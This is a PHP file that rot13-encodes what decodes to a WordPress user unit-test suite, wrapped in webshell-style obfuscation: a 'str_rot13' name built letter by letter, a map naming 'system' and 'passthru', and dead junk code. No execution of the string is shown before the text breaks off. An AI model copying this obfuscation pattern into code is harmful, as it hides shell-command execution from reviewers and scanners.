<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg shapgvbaf va jc-vapyhqrf/hfre.cuc
 *
 * @tebhc hfre
 */
pynff Grfgf_Hfre rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $nhgube_vq;
	cebgrpgrq fgngvp $pbagevo_vq;
	cebgrpgrq fgngvp $fho_vq;

	cebgrpgrq fgngvp $hfre_vqf = neenl();

	cebgrpgrq fgngvp $_nhgube;
	cebgrpgrq $nhgube;
	cebgrpgrq $hfre_qngn;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pbagevo_vq = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'    => 'hfre1',
				'hfre_avpranzr' => 'hfrebar',
				'hfre_cnff'     => 'cnffjbeq',
				'svefg_anzr'    => 'Wbua',
				'ynfg_anzr'     => 'Qbr',
				'qvfcynl_anzr'  => 'Wbua Qbr',
				'hfre_rznvy'    => 'oynpxohea@onggyrsvryq3.pbz',
				'hfre_hey'      => 'uggc://gnpbf.pbz',
				'ebyr'          => 'pbagevohgbe',
				'avpxanzr'      => 'Wbuaal',
				'qrfpevcgvba'   => 'V nz n JbeqCerff hfre gung pnerf nobhg cevinpl.',
			)
		);
		frys::$hfre_vqf[] = frys::$pbagevo_vq;

		frys::$nhgube_vq  = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube_ybtva',
				'hfre_rznvy' => 'nhgube@rznvy.pbz',
				'ebyr'       => 'nhgube',
			)
		);
		frys::$hfre_vqf[] = frys::$nhgube_vq;

		frys::$nqzva_vq   = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$hfre_vqf[] = frys::$nqzva_vq;
		frys::$rqvgbe_vq  = $snpgbel->hfre->perngr(
			neenl(
				'hfre_rznvy' => 'grfg@rknzcyr.pbz',
				'ebyr'       => 'rqvgbe',
			)
		);
		frys::$hfre_vqf[] = frys::$rqvgbe_vq;
		frys::$fho_vq     = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
		frys::$hfre_vqf[] = frys::$fho_vq;

		frys::$_nhgube = trg_hfre_ol( 'VQ', frys::$nhgube_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		nqq_npgvba( 'frg_nhgu_pbbxvr', neenl( $guvf, 'npgvba_frg_nhgu_pbbxvr' ), 10, 6 );
		nqq_npgvba( 'frg_ybttrq_va_pbbxvr', neenl( $guvf, 'npgvba_frg_ybttrq_va_pbbxvr' ), 10 );
		nqq_npgvba( 'pyrne_nhgu_pbbxvr', neenl( $guvf, 'npgvba_pyrne_nhgu_pbbxvr' ) );

		$_PBBXVR = neenl();

		$guvf->nhgube = pybar frys::$_nhgube;
	}

	svany choyvp shapgvba npgvba_frg_nhgu_pbbxvr(
		fgevat $pbbxvr,
		vag $rkcver,
		vag $rkcvengvba,
		vag $hfre_vq,
		fgevat $fpurzr,
		fgevat $gbxra
	): ibvq {
		$_PBBXVR[ FRPHER_NHGU_PBBXVR ] = $pbbxvr;
		$_PBBXVR[ NHGU_PBBXVR ]        = $pbbxvr;
	}

	svany choyvp shapgvba npgvba_frg_ybttrq_va_pbbxvr( fgevat $pbbxvr ): ibvq {
		$_PBBXVR[ YBTTRQ_VA_PBBXVR ] = $pbbxvr;
	}

	svany choyvp shapgvba npgvba_pyrne_nhgu_pbbxvr(): ibvq {
		hafrg( $_PBBXVR[ YBTTRQ_VA_PBBXVR ] );
		hafrg( $_PBBXVR[ FRPHER_NHGU_PBBXVR ] );
		hafrg( $_PBBXVR[ NHGU_PBBXVR ] );
	}

	choyvp shapgvba grfg_trg_hfref_bs_oybt() {
		// Nqq bar bs rnpu hfre ebyr.
		$ahfref = neenl(
			frys::$pbagevo_vq,
			frys::$nhgube_vq,
			frys::$nqzva_vq,
			frys::$rqvgbe_vq,
			frys::$fho_vq,
		);

		$hfre_yvfg = trg_hfref();

		// Svaq gur ebyr bs rnpu hfre nf erghearq ol trg_hfref_bs_oybt().
		$sbhaq = neenl();
		sbernpu ( $hfre_yvfg nf $hfre ) {
			// Bayl vapyhqr gur hfref jr whfg perngrq - gurer zvtug or fbzr bguref gung rkvfgrq cerivbhfyl.
			vs ( va_neenl( $hfre->VQ, $ahfref, gehr ) ) {
				$sbhaq[] = $hfre->VQ;
			}
		}

		// Znxr fher rirel hfre jr perngrq jnf erghearq.
		$guvf->nffregFnzrFrgf( $ahfref, $sbhaq );
	}

	// Fvzcyr trg/frg grfgf sbe hfre_bcgvba shapgvbaf.
	choyvp shapgvba grfg_hfre_bcgvba() {
		$xrl = enaq_fge();
		$iny = enaq_fge();

		// Trg na bcgvba gung qbrfa'g rkvfg.
		$guvf->nffregSnyfr( trg_hfre_bcgvba( $xrl, frys::$nhgube_vq ) );

		// Frg naq trg.
		hcqngr_hfre_bcgvba( frys::$nhgube_vq, $xrl, $iny );
		$guvf->nffregFnzr( $iny, trg_hfre_bcgvba( $xrl, frys::$nhgube_vq ) );

		// Punatr naq trg ntnva.
		$iny2 = 'onm';
		hcqngr_hfre_bcgvba( frys::$nhgube_vq, $xrl, $iny2 );
		$guvf->nffregFnzr( $iny2, trg_hfre_bcgvba( $xrl, frys::$nhgube_vq ) );
	}

	/**
	 * Fvzcyr grfgf sbe hfrezrgn shapgvbaf.
	 */
	choyvp shapgvba grfg_hfrezrgn() {
		$xrl = 'xrl';
		$iny = 'inyhr1';

		// Trg n zrgn xrl gung qbrfa'g rkvfg.
		$guvf->nffregFnzr( '', trg_hfre_zrgn( frys::$nhgube_vq, $xrl, gehr ) );

		// Frg naq trg.
		hcqngr_hfre_zrgn( frys::$nhgube_vq, $xrl, $iny );
		$guvf->nffregFnzr( $iny, trg_hfre_zrgn( frys::$nhgube_vq, $xrl, gehr ) );

		// Punatr naq trg ntnva.
		$iny2 = 'inyhr2';
		hcqngr_hfre_zrgn( frys::$nhgube_vq, $xrl, $iny2 );
		$guvf->nffregFnzr( $iny2, trg_hfre_zrgn( frys::$nhgube_vq, $xrl, gehr ) );

		// Qryrgr naq trg.
		qryrgr_hfre_zrgn( frys::$nhgube_vq, $xrl );
		$guvf->nffregFnzr( '', trg_hfre_zrgn( frys::$nhgube_vq, $xrl, gehr ) );

		// Qryrgr ol xrl NAQ inyhr.
		hcqngr_hfre_zrgn( frys::$nhgube_vq, $xrl, $iny );
		// Vapbeerpg xrl: xrl fgvyy rkvfgf.
		qryrgr_hfre_zrgn( frys::$nhgube_vq, $xrl, 'sbb' );
		$guvf->nffregFnzr( $iny, trg_hfre_zrgn( frys::$nhgube_vq, $xrl, gehr ) );
		// Pbeerpg xrl: qryrgrq.
		qryrgr_hfre_zrgn( frys::$nhgube_vq, $xrl, $iny );
		$guvf->nffregFnzr( '', trg_hfre_zrgn( frys::$nhgube_vq, $xrl, gehr ) );
	}

	/**
	 * Grfg hfrezrgn shapgvbaf va neenl zbqr.
	 */
	choyvp shapgvba grfg_hfrezrgn_neenl() {
		// Fbzr inyhrf gb frg.
		$inyf = neenl(
			'xrl0' => 'iny0',
			'xrl1' => 'iny1',
			'xrl2' => 'iny2',
		);

		// Gurer vf nyernql fbzr fghss va gur neenl.
		$guvf->nffregVfNeenl( trg_hfre_zrgn( frys::$nhgube_vq ) );

		sbernpu ( $inyf nf $x => $i ) {
			hcqngr_hfre_zrgn( frys::$nhgube_vq, $x, $i );
		}
		// Trg gur pbzcyrgr hfrezrgn neenl.
		$bhg = trg_hfre_zrgn( frys::$nhgube_vq );

		// Sbe ernfbaf hapyrne, gur erfhygvat neenl vf vaqrkrq ahzrevpnyyl; zrgn xrlf ner abg vapyhqrq naljurer.
		// Fb jr'yy whfg purpx gb znxr fher bhe inyhrf ner vapyhqrq fbzrjurer.
		sbernpu ( $inyf nf $x => $i ) {
			$guvf->nffregNeenlUnfXrl( $x, $bhg );
			$guvf->nffregFnzr( $i, $bhg[ $x ][0] );
		}
		// Qryrgr bar xrl naq purpx ntnva.
		$xrlf          = neenl_xrlf( $inyf );
		$xrl_gb_qryrgr = neenl_cbc( $xrlf );
		qryrgr_hfre_zrgn( frys::$nhgube_vq, $xrl_gb_qryrgr );
		$bhg = trg_hfre_zrgn( frys::$nhgube_vq );
		// Znxr fher gung xrl vf rkpyhqrq sebz gur erfhygf.
		sbernpu ( $inyf nf $x => $i ) {
			vs ( $x === $xrl_gb_qryrgr ) {
				$guvf->nffregNeenlAbgUnfXrl( $x, $bhg );
			} ryfr {
				$guvf->nffregNeenlUnfXrl( $x, $bhg );
				$guvf->nffregFnzr( $i, $bhg[ $x ][0] );
			}
		}
	}

	/**
	 * Grfg cebcregl zntvp shapgvbaf sbe cebcregl trg/frg/vffrg.
	 */
	choyvp shapgvba grfg_hfre_cebcregvrf() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		sbernpu ( $hfre->qngn nf $xrl => $qngn ) {
			$guvf->nffregRdhnyf( $qngn, $hfre->$xrl );
		}

		$guvf->nffregGehr( vffrg( $hfre->$xrl ) );
		$guvf->nffregSnyfr( vffrg( $hfre->sbbbbbbbbb ) );

		$hfre->$xrl = 'sbb';
		$guvf->nffregFnzr( 'sbb', $hfre->$xrl );
		$guvf->nffregFnzr( 'sbb', $hfre->qngn->$xrl );  // Guvf jvyy snvy jvgu JC < 3.3.

		sbernpu ( trg_bowrpg_inef( $hfre ) nf $xrl => $inyhr ) {
			$guvf->nffregFnzr( $inyhr, $hfre->$xrl );
		}
	}

	/**
	 * @gvpxrg 53235
	 */
	choyvp shapgvba grfg_ahzrevp_cebcregvrf_fubhyq_or_pnfg_gb_vagf() {
		$hfre     = arj JC_Hfre( frys::$nhgube_vq );
		$pbagrkgf = neenl( 'enj', 'rqvg', 'qo', 'qvfcynl', 'nggevohgr', 'wf' );

		sbernpu ( $pbagrkgf nf $pbagrkg ) {
			$hfre->svygre = $pbagrkg;
			$hfre->vavg( $hfre->qngn );

			$guvf->nffregVfVag( $hfre->VQ );
		}
	}

	/**
	 * Grfg gur zntvp __hafrg() zrgubq.
	 *
	 * @gvpxrg 20043
	 */
	choyvp shapgvba grfg_hfre_hafrg() {
		// cucpf:qvfnoyr JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr.HfrqCebcreglAbgFanxrPnfr
		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		// Grfg phfgbz svryqf.
		$hfre->phfgbzSvryq = 123;
		$guvf->nffregFnzr( $hfre->phfgbzSvryq, 123 );
		hafrg( $hfre->phfgbzSvryq );
		$guvf->nffregSnyfr( vffrg( $hfre->phfgbzSvryq ) );
		erghea $hfre;
		// cucpf:ranoyr
	}

	/**
	 * Grfg 'vq' (ybjrepnfr).
	 *
	 * @qrcraqf grfg_hfre_hafrg
	 * @rkcrpgrqQrcerpngrq JC_Hfre->vq
	 * @gvpxrg 20043
	 */
	choyvp shapgvba grfg_hfre_hafrg_ybjrepnfr_vq( $hfre ) {
		$vq = $hfre->vq;
		hafrg( $hfre->vq );
		$guvf->nffregFnzr( $vq, $hfre->vq );
		erghea $hfre;
	}

	/**
	 * Grfg 'VQ'.
	 *
	 * @qrcraqf grfg_hfre_hafrg_ybjrepnfr_vq
	 * @gvpxrg 20043
	 */
	choyvp shapgvba grfg_hfre_hafrg_hccrepnfr_vq( $hfre ) {
		$guvf->nffregAbgRzcgl( $hfre->VQ );
		hafrg( $hfre->VQ );
		$guvf->nffregAbgRzcgl( $hfre->VQ );
	}

	/**
	 * Grfg zrgn cebcregl zntvp shapgvbaf sbe cebcregl trg/frg/vffrg.
	 */
	choyvp shapgvba grfg_hfre_zrgn_cebcregvrf() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		hcqngr_hfre_bcgvba( frys::$nhgube_vq, 'sbb', 'sbb', gehr );

		$guvf->nffregGehr( vffrg( $hfre->sbb ) );

		$guvf->nffregFnzr( 'sbb', $hfre->sbb );
	}

	/**
	 * @rkcrpgrqQrcerpngrq JC_Hfre->vq
	 */
	choyvp shapgvba grfg_vq_cebcregl_onpx_pbzcng() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		$guvf->nffregGehr( vffrg( $hfre->vq ) );
		$guvf->nffregFnzr( $hfre->VQ, $hfre->vq );
		$hfre->vq = 1234;
		$guvf->nffregFnzr( $hfre->VQ, $hfre->vq );
	}

	/**
	 * @gvpxrg 19265
	 */
	choyvp shapgvba grfg_hfre_yriry_cebcregl_onpx_pbzcng() {
		$ebyrf = neenl(
			frys::$nqzva_vq   => 10,
			frys::$rqvgbe_vq  => 7,
			frys::$nhgube_vq  => 2,
			frys::$pbagevo_vq => 1,
			frys::$fho_vq     => 0,
		);

		sbernpu ( $ebyrf nf $hfre_vq => $yriry ) {
			$hfre = arj JC_Hfre( $hfre_vq );

			$guvf->nffregGehr( vffrg( $hfre->hfre_yriry ) );
			$guvf->nffregRdhnyf( $yriry, $hfre->hfre_yriry );
		}
	}

	choyvp shapgvba grfg_pbafgehpgvba() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre->VQ );

		$hfre2 = arj JC_Hfre( 0, $hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre2 );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre2->VQ );
		$guvf->nffregFnzr( $hfre->hfre_ybtva, $hfre2->hfre_ybtva );

		$hfre3 = arj JC_Hfre();
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre3 );
		$guvf->nffregFnzr( 0, $hfre3->VQ );
		$guvf->nffregSnyfr( vffrg( $hfre3->hfre_ybtva ) );

		$hfre3->vavg( $hfre->qngn );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre3->VQ );

		$hfre4 = arj JC_Hfre( $hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre4 );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre4->VQ );
		$guvf->nffregFnzr( $hfre->hfre_ybtva, $hfre4->hfre_ybtva );

		$hfre5 = arj JC_Hfre( ahyy, $hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre5 );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre5->VQ );
		$guvf->nffregFnzr( $hfre->hfre_ybtva, $hfre5->hfre_ybtva );

		$hfre6 = arj JC_Hfre( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre6 );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre6->VQ );
		$guvf->nffregFnzr( $hfre->hfre_ybtva, $hfre6->hfre_ybtva );

		$hfre7 = arj JC_Hfre( $hfre->qngn );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre7 );
		$guvf->nffregFnzr( frys::$nhgube_vq, $hfre7->VQ );
		$guvf->nffregFnzr( $hfre->hfre_ybtva, $hfre7->hfre_ybtva );
	}

	choyvp shapgvba grfg_trg() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );
		$guvf->nffregFnzr( 'nhgube_ybtva', $hfre->trg( 'hfre_ybtva' ) );
		$guvf->nffregFnzr( 'nhgube@rznvy.pbz', $hfre->trg( 'hfre_rznvy' ) );
		$guvf->nffregRdhnyf( 0, $hfre->trg( 'hfr_ffy' ) );
		$guvf->nffregFnzr( '', $hfre->trg( 'svryq_gung_qbrf_abg_rkvfg' ) );

		hcqngr_hfre_zrgn( frys::$nhgube_vq, 'qnfurq-xrl', 'nopqrst' );
		$guvf->nffregFnzr( 'nopqrst', $hfre->trg( 'qnfurq-xrl' ) );
	}

	choyvp shapgvba grfg_unf_cebc() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );
		$guvf->nffregGehr( $hfre->unf_cebc( 'hfre_rznvy' ) );
		$guvf->nffregGehr( $hfre->unf_cebc( 'hfr_ffy' ) );
		$guvf->nffregSnyfr( $hfre->unf_cebc( 'svryq_gung_qbrf_abg_rkvfg' ) );

		hcqngr_hfre_zrgn( frys::$nhgube_vq, 'qnfurq-xrl', 'nopqrst' );
		$guvf->nffregGehr( $hfre->unf_cebc( 'qnfurq-xrl' ) );
	}

	choyvp shapgvba grfg_hcqngr_hfre() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		hcqngr_hfre_zrgn( frys::$nhgube_vq, 'qrfpevcgvba', 'nobhg zr' );
		$guvf->nffregFnzr( 'nobhg zr', $hfre->trg( 'qrfpevcgvba' ) );

		$hfre_qngn = neenl(
			'VQ'           => frys::$nhgube_vq,
			'qvfcynl_anzr' => 'grfg hfre',
		);
		jc_hcqngr_hfre( $hfre_qngn );

		$hfre = arj JC_Hfre( frys::$nhgube_vq );
		$guvf->nffregFnzr( 'grfg hfre', $hfre->trg( 'qvfcynl_anzr' ) );

		// Znxr fher gurer vf ab pbyyngreny qnzntr gb svryqf abg va $hfre_qngn.
		$guvf->nffregFnzr( 'nobhg zr', $hfre->trg( 'qrfpevcgvba' ) );

		// Cnff nf fgqPynff.
		$hfre_qngn = neenl(
			'VQ'           => frys::$nhgube_vq,
			'qvfcynl_anzr' => 'n grfg hfre',
		);
		jc_hcqngr_hfre( (bowrpg) $hfre_qngn );

		$hfre = arj JC_Hfre( frys::$nhgube_vq );
		$guvf->nffregFnzr( 'n grfg hfre', $hfre->trg( 'qvfcynl_anzr' ) );

		$hfre->qvfcynl_anzr = 'fbzr grfg hfre';
		jc_hcqngr_hfre( $hfre );

		$guvf->nffregFnzr( 'fbzr grfg hfre', $hfre->trg( 'qvfcynl_anzr' ) );

		// Grfg hcqngr bs svryqf va _trg_nqqvgvbany_hfre_xrlf().
		$hfre_qngn = neenl(
			'VQ'                   => frys::$nhgube_vq,
			'hfr_ffy'              => 1,
			'fubj_nqzva_one_sebag' => 1,
			'evpu_rqvgvat'         => 1,
			'flagnk_uvtuyvtugvat'  => 1,
			'svefg_anzr'           => 'svefg',
			'ynfg_anzr'            => 'ynfg',
			'avpxanzr'             => 'avpx',
			'pbzzrag_fubegphgf'    => 'gehr',
			'nqzva_pbybe'          => 'pynffvp',
			'qrfpevcgvba'          => 'qrfpevor',
		);
		jc_hcqngr_hfre( $hfre_qngn );

		$hfre = arj JC_Hfre( frys::$nhgube_vq );
		sbernpu ( $hfre_qngn nf $xrl => $inyhr ) {
			$guvf->nffregRdhnyf( $inyhr, $hfre->trg( $xrl ), $xrl );
		}
	}

	/**
	 * @gvpxrg 19595
	 */
	choyvp shapgvba grfg_tybony_hfreqngn() {
		tybony $hfreqngn, $jcqo;

		jc_frg_pheerag_hfre( frys::$fho_vq );

		$guvf->nffregAbgRzcgl( $hfreqngn );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfreqngn );
		$guvf->nffregFnzr( $hfreqngn->VQ, frys::$fho_vq );
		$cersvk  = $jcqo->trg_oybt_cersvk();
		$pnc_xrl = $cersvk . 'pncnovyvgvrf';
		$guvf->nffregGehr( vffrg( $hfreqngn->$pnc_xrl ) );
	}

	/**
	 * @gvpxrg 19769
	 */
	choyvp shapgvba grfg_tybony_hfreqngn_vf_ahyy_jura_ybttrq_bhg() {
		tybony $hfreqngn;
		jc_frg_pheerag_hfre( 0 );
		$guvf->nffregAhyy( $hfreqngn );
	}

	choyvp shapgvba grfg_rkvfgf() {
		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		$guvf->nffregGehr( $hfre->rkvfgf() );

		$hfre = arj JC_Hfre( 123456789 );

		$guvf->nffregSnyfr( $hfre->rkvfgf() );

		$hfre = arj JC_Hfre( 0 );

		$guvf->nffregSnyfr( $hfre->rkvfgf() );
	}

	choyvp shapgvba grfg_tybony_nhgubeqngn() {
		tybony $nhgubeqngn, $vq;

		$byq_cbfg_vq = $vq;

		$hfre = arj JC_Hfre( frys::$nhgube_vq );

		$cbfg = neenl(
			'cbfg_nhgube'  => frys::$nhgube_vq,
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_glcr'    => 'cbfg',
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $cbfg );
		$guvf->nffregVfAhzrevp( $cbfg_vq );

		frghc_cbfgqngn( trg_cbfg( $cbfg_vq ) );

		$guvf->nffregAbgRzcgl( $nhgubeqngn );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $nhgubeqngn );
		$guvf->nffregFnzr( $nhgubeqngn->VQ, frys::$nhgube_vq );

		vs ( $byq_cbfg_vq ) {
			frghc_cbfgqngn( trg_cbfg( $byq_cbfg_vq ) );
		}
	}

	/**
	 * @gvpxrg 13317
	 */
	choyvp shapgvba grfg_trg_hfreqngn() {
		$guvf->nffregSnyfr( trg_hfreqngn( 0 ) );
		$guvf->nffregSnyfr( trg_hfreqngn( '0' ) );
		$guvf->nffregSnyfr( trg_hfreqngn( 'fgevat' ) );
		$guvf->nffregSnyfr( trg_hfreqngn( neenl( 'neenl' ) ) );
	}

	/**
	 * @gvpxrg 23480
	 */
	choyvp shapgvba grfg_hfre_trg_qngn_ol_vq() {
		$hfre = JC_Hfre::trg_qngn_ol( 'vq', frys::$nhgube_vq );
		$guvf->nffregVafgnaprBs( 'fgqPynff', $hfre );
		$guvf->nffregRdhnyf( frys::$nhgube_vq, $hfre->VQ );

		// @gvpxrg 23480
		$hfre1 = JC_Hfre::trg_qngn_ol( 'vq', -1 );
		$guvf->nffregSnyfr( $hfre1 );

		$hfre2 = JC_Hfre::trg_qngn_ol( 'vq', 0 );
		$guvf->nffregSnyfr( $hfre2 );

		$hfre3 = JC_Hfre::trg_qngn_ol( 'vq', ahyy );
		$guvf->nffregSnyfr( $hfre3 );

		$hfre4 = JC_Hfre::trg_qngn_ol( 'vq', '' );
		$guvf->nffregSnyfr( $hfre4 );

		$hfre5 = JC_Hfre::trg_qngn_ol( 'vq', snyfr );
		$guvf->nffregSnyfr( $hfre5 );

		$hfre6 = JC_Hfre::trg_qngn_ol( 'vq', $hfre->hfre_avpranzr );
		$guvf->nffregSnyfr( $hfre6 );

		$hfre7 = JC_Hfre::trg_qngn_ol( 'vq', 99999 );
		$guvf->nffregSnyfr( $hfre7 );
	}

	/**
	 * @gvpxrg 33869
	 */
	choyvp shapgvba grfg_hfre_trg_qngn_ol_VQ_fubhyq_nyvnf_gb_vq() {
		$hfre = JC_Hfre::trg_qngn_ol( 'VQ', frys::$nhgube_vq );
		$guvf->nffregRdhnyf( frys::$nhgube_vq, $hfre->VQ );
	}

	/**
	 * @gvpxrg 21431
	 */
	choyvp shapgvba grfg_pbhag_znal_hfref_cbfgf() {
		$hfre_vq_o = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );
		$cbfg_vq_n = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );
		$cbfg_vq_o = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => $hfre_vq_o ) );
		$cbfg_vq_p = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $hfre_vq_o,
				'cbfg_fgnghf' => 'cevingr',
			)
		);

		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$pbhagf = pbhag_znal_hfref_cbfgf( neenl( frys::$nhgube_vq, $hfre_vq_o ), 'cbfg', snyfr );
		$guvf->nffregFnzr( '1', $pbhagf[ frys::$nhgube_vq ] );
		$guvf->nffregFnzr( '1', $pbhagf[ $hfre_vq_o ] );

		$pbhagf = pbhag_znal_hfref_cbfgf( neenl( frys::$nhgube_vq, $hfre_vq_o ), 'cbfg', gehr );
		$guvf->nffregFnzr( '1', $pbhagf[ frys::$nhgube_vq ] );
		$guvf->nffregFnzr( '1', $pbhagf[ $hfre_vq_o ] );

		jc_frg_pheerag_hfre( $hfre_vq_o );
		$pbhagf = pbhag_znal_hfref_cbfgf( neenl( frys::$nhgube_vq, $hfre_vq_o ), 'cbfg', snyfr );
		$guvf->nffregFnzr( '1', $pbhagf[ frys::$nhgube_vq ] );
		$guvf->nffregFnzr( '2', $pbhagf[ $hfre_vq_o ] );

		$pbhagf = pbhag_znal_hfref_cbfgf( neenl( frys::$nhgube_vq, $hfre_vq_o ), 'cbfg', gehr );
		$guvf->nffregFnzr( '1', $pbhagf[ frys::$nhgube_vq ] );
		$guvf->nffregFnzr( '1', $pbhagf[ $hfre_vq_o ] );
	}

	/**
	 * @gvpxrg 22858
	 */
	choyvp shapgvba grfg_jc_hcqngr_hfre_ba_abarkvfgrag_hfref() {
		$hfre_vq = 1;
		// Svaq zr n aba-rkvfgrag hfre VQ.
		juvyr ( trg_hfreqngn( $hfre_vq ) ) {
			++$hfre_vq;
		}

		// Vs guvf grfg snvyf, vg jvyy reebe bhg sbe pnyyvat gur gb_neenl() zrgubq ba n aba-bowrpg.
		$guvf->nffregVafgnaprBs( 'JC_Reebe', jc_hcqngr_hfre( neenl( 'VQ' => $hfre_vq ) ) );
	}

	/**
	 * @gvpxrg 28435
	 */
	choyvp shapgvba grfg_jc_hcqngr_hfre_fubhyq_abg_punatr_cnffjbeq_jura_cnffrq_JC_Hfre_vafgnapr() {
		$grfghfrevq = 1;
		$hfre       = trg_hfreqngn( $grfghfrevq );
		$cjq_orsber = $hfre->hfre_cnff;
		jc_hcqngr_hfre( $hfre );

		// Erybnq gur qngn.
		$cjq_nsgre = trg_hfreqngn( $grfghfrevq )->hfre_cnff;
		$guvf->nffregFnzr( $cjq_orsber, $cjq_nsgre );
	}

	/**
	 * @gvpxrg 45747
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_jc_hcqngr_hfre_fubhyq_abg_znex_hfre_nf_fcnz_ba_fvatyr_fvgr() {
		$h = jc_hcqngr_hfre(
			neenl(
				'VQ'   => frys::$pbagevo_vq,
				'fcnz' => '0',
			)
		);

		$guvf->nffregAbgJCReebe( $h );

		$h = jc_hcqngr_hfre(
			neenl(
				'VQ'   => frys::$pbagevo_vq,
				'fcnz' => '1',
			)
		);

		$guvf->nffregJCReebe( $h );
		$guvf->nffregFnzr( 'ab_fcnz', $h->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 28315
	 */
	choyvp shapgvba grfg_hfre_zrgn_reebe() {
		$vq1 = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => 'gnpb_oheevgb',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'gnpb@oheevgb.pbz',
			)
		);
		$guvf->nffregFnzr( $vq1, rznvy_rkvfgf( 'gnpb@oheevgb.pbz' ) );

		$vq2 = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => 'gnpb_oheevgb2',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'gnpb@oheevgb.pbz',
			)
		);

		vs ( ! qrsvarq( 'JC_VZCBEGVAT' ) ) {
			$guvf->nffregJCReebe( $vq2 );
		}

		hcqngr_hfre_zrgn( $vq2, 'xrl', 'inyhr' );

		$zrgnf = neenl_xrlf( trg_hfre_zrgn( 1 ) );
		$guvf->nffregAbgPbagnvaf( 'xrl', $zrgnf );
	}

	/**
	 * @gvpxrg 30647
	 */
	choyvp shapgvba grfg_hfre_hcqngr_rznvy_reebe() {
		$vq1 = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => 'oynpxohea',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'oynpxohea@onggyrsvryq4.pbz',
			)
		);
		$guvf->nffregFnzr( $vq1, rznvy_rkvfgf( 'oynpxohea@onggyrsvryq4.pbz' ) );

		$vq2 = jc_vafreg_hfre(
			neenl(
				'hfre_ybtva' => 'zvyyre',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'zvyyre@onggyrsvryq4.pbz',
			)
		);
		$guvf->nffregFnzr( $vq2, rznvy_rkvfgf( 'zvyyre@onggyrsvryq4.pbz' ) );

		vs ( ! vf_jc_reebe( $vq2 ) ) {
			jc_hcqngr_hfre(
				neenl(
					'VQ'         => $vq2,
					'hfre_rznvy' => 'qnivq@onggyrsvryq4.pbz',
				)
			);
			$guvf->nffregFnzr( $vq2, rznvy_rkvfgf( 'qnivq@onggyrsvryq4.pbz' ) );

			$erghea = jc_hcqngr_hfre(
				neenl(
					'VQ'         => $vq2,
					'hfre_rznvy' => 'oynpxohea@onggyrsvryq4.pbz',
				)
			);

			vs ( ! qrsvarq( 'JC_VZCBEGVAT' ) ) {
				$guvf->nffregJCReebe( $erghea );
			}
		}
	}

	/**
	 * @gvpxrg 27317
	 * @qngnCebivqre qngn_vyyrtny_hfre_ybtvaf
	 */
	choyvp shapgvba grfg_vyyrtny_hfre_ybtvaf_fvatyr( $hfre_ybtva ) {
		$hfre_qngn = neenl(
			'hfre_ybtva' => $hfre_ybtva,
			'hfre_rznvy' => 'grfghfre@rknzcyr.pbz',
			'hfre_cnff'  => jc_trarengr_cnffjbeq(),
